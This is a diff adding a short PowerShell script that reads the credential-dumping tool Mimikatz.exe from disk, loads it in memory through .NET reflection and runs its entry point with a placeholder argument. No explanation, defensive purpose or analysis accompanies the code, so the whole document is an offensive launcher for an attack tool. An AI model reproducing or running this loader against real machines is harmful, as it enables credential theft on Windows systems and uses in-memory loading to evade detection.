@@ -1,0 +1,15 @@
+$assemblyPath = "Mimikatz.exe"
+[String]$param = "testparameter"
+[String[]]$parameter = @(, $param)
+
+# Read the assembly from disk into a byte array
+[Byte[]]$assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+# Load the assembly
+$assembly = [System.Reflection.Assembly]::Load($assemblyByte)
+# Find the Entrypoint or "Main" method
+$entryPoint = $assembly.EntryPoint
+# Get Parameters
+$parameter_invoke = (, $parameter )
+
+# Invoke the method with the specified parameters
+$mimikatz = $entryPoint.Invoke($null, $parameter_invoke) # Wrap the inner aray in another array litteral expression
